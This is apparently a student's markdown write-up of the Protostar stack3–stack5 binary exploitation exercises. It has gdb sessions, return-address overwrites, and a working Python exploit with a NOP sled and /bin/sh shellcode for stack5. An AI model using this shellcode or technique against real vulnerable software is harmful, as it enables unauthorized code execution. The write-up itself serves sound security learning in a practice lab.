# LiveOverflow Binary Exploitation / Memory Corruption

### 0x0D - 0x0E

For this section, we will be attempting stack3, stack4 and stack5

### Answer for Stack Three

- In Stack3, we have a function pointer which we initialise as 0

- A function pointer points to an address in memory, reference [here](https://www.w3schools.com/c/c_pointers.php)

- Based on the code, we need to change the fp variable with our buffer overflow to the memory address of the win() function

- Finding the address if the win() function (you can also use `objdump -t stack4 | win`)

    ```
    (gdb) x win
    0x8048424 <win>:	0x83e58955
    ```

- Final Answer

    `python -c "print('A'*64+'\x24\x84\x04\x08')" | /opt/protostar/bin/stack3`

### Answer for Stack Four

- Without pointer, how do we redirect code execution? Overwriting the eip instruction pointer ;)

- Some information:

    ```
    (gdb) x/wx win
    0x80483f4 <win>:	0x83e58955
    (gdb) r
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y
    Starting program: /opt/protostar/bin/stack4 
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN
    
    Breakpoint 1, main (argc=1162167621, argv=0x46464646) at stack4/stack4.c:16
    16	in stack4/stack4.c
    (gdb) c
    Continuing.
    
    Program received signal SIGSEGV, Segmentation fault.
    0x44444444 in ?? ()
    (gdb) info registers
    eax            0xbffffca0	-1073742688
    ecx            0xbffffca0	-1073742688
    edx            0xb7fd9334	-1208118476
    ebx            0xb7fd7ff4	-1208123404
    esp            0xbffffcf0	0xbffffcf0
    ebp            0x43434343	0x43434343
    esi            0x0	0
    edi            0x0	0
    eip            0x44444444	0x44444444
    eflags         0x210246	[ PF ZF IF RF ID ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51
    (gdb) 
    ```

- Final Answer

    `python -c "print('A'*76+'\xf4\x83\x04\x08')" | /opt/protostar/bin/stack4`

### Background for Stack Five

- Given the following input string:

	```
	$ python -c "print('A'*76+'B'*20)" > /tmp/output
	(gdb) set disassembly-flavor intel
	(gdb) r < /tmp/output
	Starting program: /opt/protostar/bin/stack5 < /tmp/output

	Program received signal SIGSEGV, Segmentation fault.
	0x42424242 in ?? ()
	(gdb) info registers
	eax            0xbffffca0	-1073742688
	ecx            0xbffffca0	-1073742688
	edx            0xb7fd9334	-1208118476
	ebx            0xb7fd7ff4	-1208123404
	esp            0xbffffcf0	0xbffffcf0
	ebp            0x41414141	0x41414141
	esi            0x0	0
	edi            0x0	0
	eip            0x42424242	0x42424242
	eflags         0x210246	[ PF ZF IF RF ID ]
	cs             0x73	115
	ss             0x7b	123
	ds             0x7b	123
	es             0x7b	123
	fs             0x0	0
	gs             0x33	51
	(gdb) x/s $esp
	0xbffffcf0:	 'B' <repeats 16 times>
	(gdb) 
	```

	- We know that the padding length is 76 before we start to overwrite eip with 4 'B's.

	- We also know that the rest of our input string overflows to esp as we observe that esp is pointing to 0xbffffcf0 which contains the rest of our 20 - 4  = 16 'B's

	- Hence, what we can do is that, we can overwrite the 4 'B's that overflowed into the eip register to redirect it to the esp address since and we can put shellcode to be executed once the program has been properly redirected.

	- In the past few examples, we hardcode the register values based on what we have reversed. When we do it this way, we will have to reverse the sequence of bytes due to big endian format of computer architecture. Instead, we can use the struct library to help us

- Writing our first exploit

	```
	$ cat ex.py
	import struct
	padding = "A" * 76
	eip = "\xf0\xfc\xff\xbf"
	exploit="\xCC"*1
	#exploit="C"*20
	print padding+eip+exploit
	$ python ex.py > /tmp/output
	...
	(gdb) r < /tmp/output
	Starting program: /opt/protostar/bin/stack5 < /tmp/output

	Program received signal SIGTRAP, Trace/breakpoint trap.
	0xbffffcf1 in ?? ()
	(gdb) info registers
	eax            0xbffffca0	-1073742688
	ecx            0xbffffca0	-1073742688
	edx            0xb7fd9334	-1208118476
	ebx            0xb7fd7ff4	-1208123404
	esp            0xbffffcf0	0xbffffcf0
	ebp            0x41414141	0x41414141
	esi            0x0	0
	edi            0x0	0
	eip            0xbffffcf1	0xbffffcf1
	eflags         0x200246	[ PF ZF IF ID ]
	cs             0x73	115
	ss             0x7b	123
	ds             0x7b	123
	es             0x7b	123
	fs             0x0	0
	gs             0x33	51
	(gdb) x/s $esp
	0xbffffcf0:	  <incomplete sequence \314>
	(gdb) x/s $eip
	0xbffffcf1:	 ""
	(gdb) c
	Continuing.

	Program received signal SIGSEGV, Segmentation fault.
	0xbffffcf3 in ?? ()
	```

	- So we managed to redirect code execution by overwriting the eip address to the address that esp is pointing to since that is where our overwritten code continues to overflow

	- "\xCC" is equivalent to a breakpoint and we observe that when we run the program, it will stop at 0xbffffcf1, which is 1 instruction from the address that $esp is pointing to at 0xbffffcf0. From this, we know that our "\xCC" code is being executed.

- Answer for Stack 5 (in Python)

    ```
    import struct

    padding     = "A" * 76
    # eip         = "\xf0\xfc\xff\xbf"
    eip         = struct.pack("I", 0xbffffcf0+30) # add 30 due to unreliability in stack
    breakpoints = "\xCC" * 4
    nopsled     = "\x90" * 100
    exploit     = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

    print padding+eip+nopsled+exploit
    ```

- Command:

    `(python ex.py ; cat) | /opt/protostar/bin/stack5`

- Some explanations:

    1. The reason why you need to add the nopsled along with the +30 at our esp location is because due to unreliability of stack memory address affected by many factors

        - In the video that LiveOverflow did the walkthrough, it was due to the environmental variables.

        - When I tried running the exploit in gdb even when I was not in the `/opt/protostar/bin` directory but the `/home/user` directory, the exploit was still working (which should not as shown in the video when LiveOverflow ran stack5 in the `/tmp` directory). Hence, I suspect that there are other factors affecting the reliability of the stack as well.
        
        - When I actually attempted to reset the environmental variables via `set -i` and run the executable with the input string in bash, I would encounter segmentation faults instead of hititng the breakpoint as seen in minute 8:53 of the video (you can apparently do it in gdb using `(gdb) set exec-wrapper /usr/bin/env -i` as referenced from the comments in the video).

    2. You need the `cat` at the end to prevent the shell from closing and also to allow you to pipe commands in after you have executed `/bin/sh` shellcode in the stack buffer!

    3. This is what happend without the `cat` command (note that doing this will replace the executable being ran in gdb to /bin/dash and to reload stack5, run `file stack5`)

        ```
        python ex.py | /opt/protostar/bin/stack5
        python ex.py > /tmp/output
        ...
        (gdb) r < /tmp/output
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /opt/protostar/bin/stack5 < /tmp/output
        
        Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x41414149
        ) at stack5/stack5.c:11
        11	in stack5/stack5.c
        (gdb) c
        Continuing.
        Executing new program: /bin/dash
        
        Program exited normally.
        ```

### Other observations

```
$ cat ex.py
import struct

padding       = "A" * 76
eip_no_offset = "\xf0\xfc\xff\xbf"
eip           = struct.pack("I", 0xbffffcf0+30) # add 30 due to unreliability in stack
breakpoints   = "\xCC" * 4
nopsled       = "\x90" * 100
exploit       = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

print padding+eip_no_offset+breakpoints
$ gdb /opt/protostar/bin/stack5
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble *main
Dump of assembler code for function main:
0x080483c4 <main+0>:	push   ebp
0x080483c5 <main+1>:	mov    ebp,esp
0x080483c7 <main+3>:	and    esp,0xfffffff0
0x080483ca <main+6>:	sub    esp,0x50
0x080483cd <main+9>:	lea    eax,[esp+0x10]
0x080483d1 <main+13>:	mov    DWORD PTR [esp],eax
0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:	leave  
0x080483da <main+22>:	ret    
End of assembler dump.
(gdb) break *0x080483da
Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11.
(gdb) r < /tmp/output
Starting program: /opt/protostar/bin/stack5 < /tmp/output

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x41414149
) at stack5/stack5.c:11
11	stack5/stack5.c: No such file or directory.
	in stack5/stack5.c
(gdb) x $esp
0xbffffcec:	0xbffffcf0
(gdb) x $eip
0x80483da <main+22>:	0x909090c3
(gdb) si
Cannot access memory at address 0x41414145
(gdb) x $eip
0xbffffcf0:	0xcccccccc
(gdb) x $esp
0xbffffcf0:	0xcccccccc
(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
0xbffffcf1 in ?? ()
(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
0xbffffcf2 in ?? ()
(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
0xbffffcf3 in ?? ()
(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
0xbffffcf4 in ?? ()
(gdb) x $esp
0xbffffcf0:	0xcccccccc
(gdb) x $eip
0xbffffcf4:	0xbffffd00
(gdb) c
Continuing.

Program received signal SIGILL, Illegal instruction.
0xbffffcf6 in ?? ()
(gdb) x $esp
0xbffffcf0:	0xcccccccc
(gdb) x $eip
0xbffffcf6:	0xfd9cbfff
```

### References

- Shellcode obtained from https://shell-storm.org/shellcode/files/shellcode-811.php


